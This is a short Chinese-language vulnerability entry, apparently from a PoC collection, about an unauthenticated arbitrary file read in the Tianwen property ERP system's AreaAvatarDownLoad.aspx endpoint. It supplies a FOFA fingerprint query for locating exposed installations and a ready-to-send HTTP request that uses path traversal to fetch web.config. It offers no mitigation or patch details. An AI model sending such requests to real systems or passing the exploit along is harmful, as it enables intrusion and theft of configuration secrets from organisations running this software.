# 天问物业ERP系统AreaAvatarDownLoad.aspx任意文件读取漏洞

天问物业ERP系统` /HM/M_Main/InformationManage/AreaAvatarDownLoad.aspx `接口处存在任意文件读取漏洞，未经身份验证的攻击者可以利用此漏洞读取系统内部配置文件，造成信息泄露，导致系统处于极不安全的状态。

## fofa

```yaml
body="天问物业ERP系统" || body="国家版权局软著登字第1205328号" || body="/HM/M_Main/frame/sso.aspx"
```

## poc

```yaml
GET /HM/M_Main/InformationManage/AreaAvatarDownLoad.aspx?AreaAvatar=../web.config HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407222335701.png)